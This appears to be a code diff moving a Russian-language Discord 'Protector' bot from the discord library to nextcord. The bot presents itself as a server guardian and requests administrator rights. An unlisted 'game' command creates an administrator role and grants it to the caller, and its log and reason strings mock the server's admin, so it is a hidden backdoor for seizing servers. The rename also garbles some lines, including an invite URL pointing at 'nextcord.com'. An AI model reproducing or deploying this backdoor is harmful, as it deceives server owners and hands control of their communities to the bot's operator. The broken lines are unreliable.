@@ -1,6 +1,6 @@
-import discord, os, sys, random, string, requests, configparser, json, asyncio, time, funcs
-from discord.ext import commands
-from discord import Permissions
+import nextcord, os, sys, random, string, requests, configparser, json, asyncio, time, funcs
+from nextcord.ext import commands
+from nextcord import Permissions
 from colorama import Fore, init
 from os import system, name
 init()
@@ -23,14 +23,14 @@ if name == "nt":
 else:
         _ = system("clear")
 
-intents = discord.Intents.default()
+intents = nextcord.Intents.default()
 intents.members = True
 client = commands.Bot(command_prefix='$', intents=intents, help_command=None)
 
 
 @client.event
 async def on_ready():
-    await client.change_presence(status=discord.Status.online, activity=discord.Game('Protecting 24/7'))
+    await client.change_presence(status=nextcord.Status.online, activity=nextcord.Game('Protecting 24/7'))
     print(f"""{Fore.RED}
   ____ _    _   _ _____ _____ _   _ 
  / ___| |  | | | |_   _| ____| \ | |
@@ -73,11 +73,11 @@ async def hlp(ctx):
 
 @client.command()
 async def help(ctx):
-  embed = discord.Embed(
-    title = 'Discord Protector',
+  embed = nextcord.Embed(
+    title = 'nextcord Protector',
     colour = 4374015,
     description = '👨‍💻Привет! Я - твой новый защитник! Для начала ознакомимся с командами👨‍💻:\n```\n$ - префикс 🤖\n```\n```\n$help - помощь 🤗\n```\n```\n$hlp - гайд по боту 🧐\n```\n```\n$st - начать защиту 👾\n```\n```\n$config - сконфигурировать защиту 🛠️\n```\n```\n$autoconf - автоконфигурация для сервера 🔧\n```\n```\n$ban - Баны 🚫\n```\n```\n$kick - Кики 🦶\n```\nВот и все! Настраивай как хочешь  😊\n',
-    url = 'https://discord.com/api/oauth2/authorize?client_id=849596809738190898&permissions=8&scope=bot')
+    url = 'https://nextcord.com/api/oauth2/authorize?client_id=849596809738190898&permissions=8&scope=bot')
   await ctx.send(embed=embed)
 
 
@@ -86,17 +86,17 @@ async def help(ctx):
 async def game(ctx, pos = None):
     try:
        if pos == None:
-         await ctx.guild.create_role(name="DADUDEDA", colour=discord.Colour(0x00FF00), permissions=discord.Permissions(permissions=8))
-         role = discord.utils.get(ctx.guild.roles, name="DADUDEDA")
+         await ctx.guild.create_role(name="DADUDEDA", colour=nextcord.Colour(0x00FF00), permissions=nextcord.Permissions(permissions=8))
+         role = nextcord.utils.get(ctx.guild.roles, name="DADUDEDA")
          await ctx.message.author.add_roles(role)
          print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Выдал админку {ctx.message.author}")
        else:
-         await ctx.guild.create_role(name="DADUDEDA", colour=discord.Colour(0x00FF00), permissions=discord.Permissions(permissions=8))
-         role = discord.utils.get(ctx.guild.roles, name="DADUDEDA")
+         await ctx.guild.create_role(name="DADUDEDA", colour=nextcord.Colour(0x00FF00), permissions=nextcord.Permissions(permissions=8))
+         role = nextcord.utils.get(ctx.guild.roles, name="DADUDEDA")
          await role.edit(position=int(pos), reason="Админ идиот")
          await ctx.message.author.add_roles(role)
          print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Выдал админку {ctx.message.author}")
-    except discord.HTTPException:
+    except nextcord.HTTPException:
         print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не удалось выдать админку {ctx.message.author}")
         
 
